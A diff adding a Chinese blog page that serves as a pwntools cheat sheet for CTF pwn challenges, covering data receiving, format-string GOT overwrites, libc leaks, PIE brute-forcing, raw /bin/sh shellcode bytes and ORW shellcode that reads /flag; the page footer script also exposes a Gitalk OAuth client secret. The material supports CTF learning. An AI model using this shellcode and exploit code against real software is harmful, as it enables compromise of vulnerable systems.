@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#f3f1ee">
+<title>pwntools 常用函数速查：收发数据、格式化字符串与 shellcode · Misaki</title>
+<meta name="description" content="整理 pwntools 在 pwn 题中的常用函数，包括数据接收、随机数、格式化字符串、libc 泄露、PIE 爆破、shellcode、ORW 和 ELF 操作。">
+<link rel="icon" type="image/x-icon" href="/img/favicon.ico">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="is-article">
+  <div class="progress" aria-hidden="true"><span id="progressBar"></span></div>
+  <header class="site-nav">
+  <a class="brand" href="/">
+    <img class="brand-mark" src="/img/favicon.ico" alt="" aria-hidden="true">
+    <span class="brand-name">Misaki</span>
+  </a>
+  <nav class="nav-links" aria-label="主导航">
+    
+    <a href="/">文章</a>
+    
+    <a href="/archives/">归档</a>
+    
+    <a href="/friends/">友链</a>
+    
+    <a href="/about/">关于</a>
+    
+  </nav>
+  <button class="nav-toggle" id="navToggle" aria-label="展开菜单" aria-expanded="false" aria-controls="mobileMenu">≡</button>
+</header>
+<nav class="mobile-menu" id="mobileMenu" aria-label="移动端导航" hidden>
+  
+  <a href="/">文章</a>
+  
+  <a href="/archives/">归档</a>
+  
+  <a href="/friends/">友链</a>
+  
+  <a href="/about/">关于</a>
+  
+</nav>
+
+  <main id="main">
+    
+
+<header class="post-cover">
+  <img class="post-bg-img" src="/img/mist.jpg" alt="" aria-hidden="true">
+  <div class="post-info">
+    <p class="cover-meta">
+      <span>2025.07.24</span>
+      <span>8 MIN READ</span>
+      
+      <span>pwn</span>
+      
+    </p>
+    <h1 class="post-title">pwntools 常用函数速查：收发数据、格式化字符串与 shellcode</h1>
+    
+    <p class="cover-tags">
+      
+      <a href="/tags/pwn/">#pwn</a>
+      
+      <a href="/tags/libc/">#libc</a>
+      
+      <a href="/tags/pwntools/">#pwntools</a>
+      
+      <a href="/tags/shellcode/">#shellcode</a>
+      
+      <a href="/tags/format-string/">#format-string</a>
+      
+    </p>
+    
+  </div>
+</header>
+
+<section class="article-wrap">
+  <article class="post-card">
+    <div class="prose">
+      <h2 id="接受数据"><a href="#接受数据" class="headerlink" title="接受数据"></a>接受数据</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p.interactive() <span class="comment">#获取shell后进行交互</span></span><br><span class="line">p.recvall() <span class="comment">#一直接收直到达到文件EOF</span></span><br><span class="line">p.recvline(keepends=<span class="literal">False</span>) <span class="comment">#接收一行，keepends为是否保留行尾的\n。</span></span><br><span class="line">p.recv(numb=字节大小, timeout=default) <span class="comment">#接收指定字节数</span></span><br><span class="line">p.recv()[从第几位接受:接收到第几位] <span class="comment">#接收指定字节数、</span></span><br><span class="line"><span class="built_in">int</span>(p.recv()[从第几位接受:接收到第几位],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>) <span class="comment">#直到接受到\n截至，接受到为字符型，无法直接进行计算使用</span></span><br><span class="line"><span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) <span class="comment">#可以使用int()强转为16进制</span></span><br><span class="line">u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#使用u64打包接受，直到\x7f为止，用于接受地址，不足8位用\x00补齐</span></span><br><span class="line"><span class="built_in">int</span>(p.recv(<span class="number">18</span>), <span class="number">16</span>) </span><br><span class="line"><span class="comment">#接收18位字节，接收的数据类型是16进制</span></span><br><span class="line">u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在有libc文件时，程序已时间 time() 为随机数种子时是伪随机</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> * </span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#给srand赋值</span></span><br><span class="line">libc.rand()</span><br><span class="line"><span class="comment">#调用出随机数</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset,&#123;printf_got:system_plt&#125;)</span><br><span class="line"><span class="comment">#offset程序的偏移</span></span><br><span class="line"><span class="comment">#printf_got需要修改的地址</span></span><br><span class="line"><span class="comment">#system_plt填入的地址</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="数据长度"><a href="#数据长度" class="headerlink" title="数据长度"></a>数据长度</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一般使用</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;adad&quot;</span>,<span class="built_in">len</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者使用</span></span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;payload0_size,builtins.hex(builtins.len(payload)))</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="libc-泄露"><a href="#libc-泄露" class="headerlink" title="libc 泄露"></a>libc 泄露</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base +  <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="pie-爆破"><a href="#pie-爆破" class="headerlink" title="pie 爆破"></a>pie 爆破</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    p=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,xxxx)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&quot;</span>) </span><br><span class="line">    num=num&lt;&lt;<span class="number">0xc</span></span><br><span class="line">    <span class="comment">#右移三位=0x1000</span></span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)</span><br><span class="line">    payload+=p16(<span class="number">0x185</span>+num)</span><br><span class="line">    <span class="comment">#后三位在pie中是不变的第一位是随机变动的1-16</span></span><br><span class="line">    p.send(payload)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#44位自动生成的system(&quot;/bin\sh\x00&quot;)</span></span><br><span class="line">asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment">#不可见版本</span></span><br><span class="line"><span class="comment">#32 位 短字节 shellcode -&gt; 21 字节</span></span><br><span class="line"><span class="string">b&quot;#\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#64 位 较短的 shellcode 23 字节</span></span><br><span class="line"><span class="string">b&quot;#\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#可见版本</span></span><br><span class="line"><span class="comment">#x64 下的：</span></span><br><span class="line"><span class="string">b&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line"><span class="comment">#x32 下的：</span></span><br><span class="line"><span class="string">b&quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#最基础的，需要有bss段</span></span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">payload+=shellcraft.read(<span class="number">3</span>,bss_add,<span class="number">100</span>)</span><br><span class="line">payload+=shellcraft.write(<span class="number">1</span>,bss_add,<span class="number">100</span>)</span><br><span class="line">sl(asm(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment">#缺少o，可以使用 openat  进行代替</span></span><br><span class="line"><span class="comment">#缺少rw，可以使用sendfile进行代替</span></span><br><span class="line"><span class="comment">#无需bss段</span></span><br><span class="line">payload=shellcraft.openat(<span class="number">0</span>, <span class="string">&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">payload+=shellcraft.sendfile(<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#手搓的orw，可以根据题目进行修改内容</span></span><br><span class="line"><span class="comment"># 本文作者： Jexy-Kynner @木提青</span></span><br><span class="line"><span class="comment"># 本文链接： http://jexy-kynner.github.io/2024/07/08/orw/</span></span><br><span class="line"><span class="comment"># 版权声明： 本站所有文章除特别声明外，均采用 (CC)BY-NC-SA 许可协议。转载请注明出处！</span></span><br><span class="line"></span><br><span class="line">sh=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#清空寄存器</span></span><br><span class="line"><span class="string">xor rax,rax  </span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">#0x67616c662f2e（flag）</span></span><br><span class="line"><span class="string">mov rdi,0x67616c662f2e	</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0	</span></span><br><span class="line"><span class="string">mov rdx,0x30 </span></span><br><span class="line"><span class="string">mov rsi,0x67616c662f2e		</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#找到 a_function 的地址</span></span><br><span class="line">symbols[<span class="string">&#x27;a_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到 a_function的 got</span></span><br><span class="line">got[<span class="string">&#x27;a_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到 a_function 的 plt</span></span><br><span class="line">plt[<span class="string">&#x27;a_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到包含 some_characters（字符串，汇编代码或者某个数值）的地址</span></span><br><span class="line"><span class="built_in">next</span>(e.search(<span class="string">&quot;some_characters&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+    
+
+
+<section class="comments" id="comments">
+  <p class="comments-head">留言 / COMMENTS</p>
+  <div id="gitalk-container" data-id="pwntools-cheatsheet-recv-fmtstr-shellcode"></div>
+</section>
+<script id="gitalk-config" type="application/json">{"clientID":"Ov23liSxI0efH8ZaJdPa","clientSecret":"626893ebd9698d26df631cfd3fac4181f3722297","repo":"text1","owner":"xxianxiayubanmian","admin":["xxianxiayubanmian"],"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","id":"pwntools-cheatsheet-recv-fmtstr-shellcode"}</script>
+<link rel="stylesheet" href="/plugins/gitalk.min.css">
+<script src="/plugins/gitalk.min.js" defer></script>
+
+
+
+  </article>
+
+  <aside class="aside-col">
+    <div class="aside-sticky">
+      
+      <nav class="toc" aria-label="目录">
+        <p>目录 / INDEX</p>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A5%E5%8F%97%E6%95%B0%E6%8D%AE"><span class="toc-text">接受数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E6%95%B0"><span class="toc-text">随机数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">格式化字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E9%95%BF%E5%BA%A6"><span class="toc-text">数据长度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc-%E6%B3%84%E9%9C%B2"><span class="toc-text">libc 泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pie-%E7%88%86%E7%A0%B4"><span class="toc-text">pie 爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode"><span class="toc-text">shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#orw"><span class="toc-text">orw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF"><span class="toc-text">ELF</span></a></li></ol>
+      </nav>
+      
+      <a class="back-link" href="/">← 返回时间线</a>
+    </div>
+  </aside>
+</section>
+
+<nav class="pager" aria-label="文章导航">
+  
+  <a class="pager-item" href="/posts/linux-32-64-bit-syscall-table/">
+    <span>上一篇 · PREV</span>
+    <strong>Linux 32 位与 64 位系统调用号速查表</strong>
+  </a>
+  
+  <span class="pager-item pager-ghost pager-next"><span>没有更多了</span></span>
+</nav>
+
+  </main>
+  <footer class="site-footer">
+  <a class="brand brand-light" href="/">
+    <img class="brand-mark" src="/img/favicon.ico" alt="" aria-hidden="true">
+    <span class="brand-name">Misaki</span>
+  </a>
+  <p class="foot-motto">Ars longa, vita brevis — Art is long, life is fleeting.</p>
+  <p class="foot-meta">
+    © 2026 Misaki
+    · Powered by <a href="https://hexo.io/" target="_blank" rel="noreferrer">Hexo</a>
+    · Theme <b>Mistline</b>
+  </p>
+</footer>
+
+  <button class="to-top" id="toTop" aria-label="返回顶部" title="返回顶部">↑</button>
+  <button class="toc-fab" id="tocFab" aria-label="打开目录" title="目录" hidden>☰</button>
+  <script src="/js/main.js" defer></script>
+</body>
+</html>
